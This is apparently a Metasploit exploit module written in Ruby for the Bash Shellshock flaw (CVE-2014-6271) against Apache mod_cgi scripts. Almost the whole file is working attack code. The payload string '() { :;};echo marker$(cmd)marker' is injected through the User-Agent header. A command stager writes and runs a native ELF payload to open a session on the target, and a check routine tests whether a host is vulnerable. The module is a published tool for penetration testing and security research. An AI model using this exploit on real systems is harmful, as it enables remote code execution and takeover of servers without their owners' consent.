##
	# This module requires Metasploit: http//metasploit.com/download
	# Current source: https://github.com/rapid7/metasploit-framework

	##
	
	require 'msf/core'
	
	class Metasploit4 < Msf::Exploit::Remote
	  Rank = GoodRanking
	
	  include Msf::Exploit::Remote::HttpClient
	  include Msf::Exploit::CmdStager
	
	  def initialize(info = {})
	    super(update_info(info,
	      'Name' => 'Apache mod_cgi Bash Environment Variable Code Injection',
	      'Description' => %q{
	        This module exploits a code injection in specially crafted environment
	        variables in Bash, specifically targeting Apache mod_cgi scripts through
	        the HTTP_USER_AGENT variable.
	      },
	      'Author' => [
	        'Stephane Chazelas', # Vulnerability discovery
	        'wvu', # Original Metasploit aux module
	        'juan vazquez' # Allow wvu's module to get native sessions
	      ],
	      'References' => [
	        ['CVE', '2014-6271'],
	       ['URL', 'https://access.redhat.com/articles/1200223'],
	        ['URL', 'http://seclists.org/oss-sec/2014/q3/649']
	      ],
	      'Payload'        =>
	        {
	          'DisableNops' => true,
	          'Space'       => 2048
	        },
	      'Targets'        =>
	        [
	          [ 'Linux x86',
	            {
	              'Platform'        => 'linux',
	              'Arch'            => ARCH_X86,
	              'CmdStagerFlavor' => [ :echo, :printf ]
	            }
	          ],
	          [ 'Linux x86_64',
	            {
	              'Platform'        => 'linux',
	              'Arch'            => ARCH_X86_64,
	              'CmdStagerFlavor' => [ :echo, :printf ]
	            }
	          ]
	        ],
	      'DefaultTarget' => 0,
	      'DisclosureDate' => 'Sep 24 2014',
	      'License' => MSF_LICENSE
	    ))
	
	    register_options([
	      OptString.new('TARGETURI', [true, 'Path to CGI script']),
	      OptEnum.new('METHOD', [true, 'HTTP method to use', 'GET', ['GET', 'POST']]),
	      OptInt.new('CMD_MAX_LENGTH', [true, 'CMD max line length', 2048]),
	      OptString.new('RPATH', [true, 'Target PATH for binaries used by the CmdStager', '/bin']),
	      OptInt.new('TIMEOUT', [true, 'HTTP read response timeout (seconds)', 5])
	    ], self.class)
	  end
	
	  def check
	    res = req("echo #{marker}")
	
	    if res && res.body.include?(marker * 3)
	      Exploit::CheckCode::Vulnerable
	    else
	      Exploit::CheckCode::Safe
	    end
	  end
	
	  def exploit
	    # Cannot use generic/shell_reverse_tcp inside an elf
	    # Checking before proceeds
	    if generate_payload_exe.blank?
	      fail_with(Failure::BadConfig, "#{peer} - Failed to store payload inside executable, please select a native payload")
	    end
	
	    execute_cmdstager(:linemax => datastore['CMD_MAX_LENGTH'], :nodelete => true)
	
	    # A last chance after the cmdstager
	    # Trying to make it generic
	    unless session_created?
	      req("#{stager_instance.instance_variable_get("@tempdir")}#{stager_instance.instance_variable_get("@var_elf")}")

	    end
	  end
	
	  def execute_command(cmd, opts)
	    cmd.gsub!('chmod', "#{datastore['RPATH']}/chmod")
	
	    req(cmd)
	  end
	
	  def req(cmd)
	    send_request_cgi(
	      {
	        'method' => datastore['METHOD'],
	        'uri' => normalize_uri(target_uri.path.to_s),
	        'agent' => "() { :;};echo #{marker}$(#{cmd})#{marker}"
	      }, datastore['TIMEOUT'])
	  end
	
	  def marker
	    @marker ||= rand_text_alphanumeric(rand(42) + 1)
	  end
	end

